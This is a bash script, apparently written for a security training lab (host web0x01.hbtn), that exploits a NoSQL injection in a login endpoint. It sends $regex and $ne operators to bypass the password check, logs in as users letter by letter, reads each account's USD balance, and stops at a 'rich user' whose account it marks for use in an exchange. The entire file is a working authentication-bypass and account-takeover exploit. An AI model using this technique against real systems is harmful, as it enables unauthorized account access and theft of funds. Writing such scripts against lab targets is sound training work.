#!/bin/bash

URL="http://web0x01.hbtn/api/a3/nosql_injection"
THRESHOLD=105818

echo "[*] Starting NoSQL user enumeration..."

for c in {a..z}; do
  echo "[*] Testing usernames starting with: $c"

  # Login with NoSQL injection
  curl -s -c cookies.txt -X POST "$URL/sign_in" \
    -H "Content-Type: application/json" \
    -d "{ \"username\": { \"\$regex\": \"^$c\" }, \"password\": { \"\$ne\": \"\" } }" \
    > /dev/null

  RESPONSE=$(curl -s -b cookies.txt "$URL/user_info")

  # Check success
  if echo "$RESPONSE" | grep -q '"status": "success"'; then
    USERNAME=$(echo "$RESPONSE" | sed -n 's/.*"username": "\([^"]*\)".*/\1/p')

    # Extract USD amount correctly
    USD=$(echo "$RESPONSE" | sed -n 's/.*"coin": "USD".*"amount": \([0-9]\+\).*/\1/p')

    if [ -n "$USD" ]; then
      echo "    → User: $USERNAME | USD: $USD"

      if [ "$USD" -ge "$THRESHOLD" ]; then
        echo ""
        echo "🔥 FOUND RICH USER 🔥"
        echo "Username: $USERNAME"
        echo "USD Balance: $USD"
        echo ""
        echo "STOP HERE. Use this account for the exchange."
        exit 0
      fi
    fi
  fi
done

echo "[-] No rich user found in a..z range."
